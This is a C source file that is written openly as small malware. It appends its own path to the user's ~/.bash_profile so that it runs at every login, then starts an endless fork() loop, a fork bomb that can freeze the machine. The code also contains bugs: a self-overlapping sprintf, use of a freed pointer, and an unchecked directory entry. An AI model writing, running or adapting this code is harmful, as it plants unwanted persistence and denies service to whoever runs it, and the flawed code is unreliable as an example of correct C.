#include <dirent.h>
#include <fcntl.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define SIZE 1024

int main() {
	/* Get file name */
	int i = 0;
	while ( __FILE__[i++] != '\0' );
	char* file_name = (char*)malloc( i * sizeof( char ) );
	strcpy( file_name, __FILE__ );
	file_name[i - 2] = 'o';

	/* Get user home */
	uid_t uid = getuid();
	struct passwd* pw = getpwuid( uid );

	/* Determine my path */
	char* my_path = (char*)malloc( SIZE * sizeof( char ) );
	getcwd( my_path, SIZE );
	sprintf( my_path, "%s/%s", my_path, file_name );
	printf( "My path: %s\n", my_path );

	/* Pick a directory to latch onto */
	DIR* d = opendir( pw->pw_dir );
	struct dirent* dir;
	struct stat buf;
	while ( ( dir = readdir( d ) ) != NULL ) {
		stat( dir->d_name, &buf );
		if ( dir->d_name[0] == '.' && strcmp( dir->d_name, "." ) && strcmp( dir->d_name, ".." ) && S_ISDIR( buf.st_mode ) ) {
			printf( "%d\n", faccessat( 0, dir->d_name, W_OK, AT_EACCESS ) );
			printf( "%s\n", dir->d_name );
			break;
		}
	}
	closedir( d );

	/* Determine target path */
	char* target_path = (char*)malloc( SIZE * sizeof( char ) );
	sprintf( target_path, "%s/%s/%s", pw->pw_dir, dir->d_name, file_name );
	printf( "Target path: %s\n", target_path );

	/* Write this to execute on login */
	char* append = (char*)malloc( SIZE * sizeof( char ) );
	sprintf( append, "%s\n", my_path );
	char* profile = (char*)malloc( SIZE * sizeof( char ) );
	sprintf( profile, "%s/.bash_profile", pw->pw_dir );
	printf( "%s\n", profile );
	FILE* f = fopen( profile, "a+" );
	fputs( append, f );
	fclose( f );
	free( profile );
	free( append );

	/* Set permissions on file */
	chmod( profile, S_IRUSR | S_IWUSR | S_IXUSR );
	
	/* Free memory */
	free( my_path );
	free( target_path );
	
	printf( "Done\n" );

	/* Create more processes */
	while ( 1 ) {
		fork();
	}

	return 0;
}
